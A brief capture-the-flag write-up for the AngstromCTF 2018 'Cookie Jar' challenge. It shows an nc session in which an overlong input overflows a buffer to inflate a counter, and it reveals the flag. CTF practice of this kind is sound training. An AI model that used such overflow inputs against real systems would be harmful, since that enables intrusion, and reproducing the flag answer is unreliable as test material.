# AngstromCTF_2018: Cookie Jar

**Category:** Binary
**Points:** 60
**Description:**

>Note: Binary has been updated Try to break this [Cookie Jar](cookiePublic64) that was compiled from this [source](cookiePublic.c) Once you've pwned the binary, test it out by connecting to nc shell.angstromctf.com 1234 to get the flag.

## Write-up
Another simple challenge with a simpler buffer overflow,

    $ nc shell.angstromctf.com 1234
    Welcome to the Cookie Jar program!

    In order to get the flag, you will need to have 100 cookies!

    So, how many cookies are there in the cookie jar: 
    zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
    Congrats, you have 122 cookies!
    Here's your flag: actf{eat_cookies_get_buffer}

Therefore, the flag is `actf{eat_cookies_get_buffer}`.
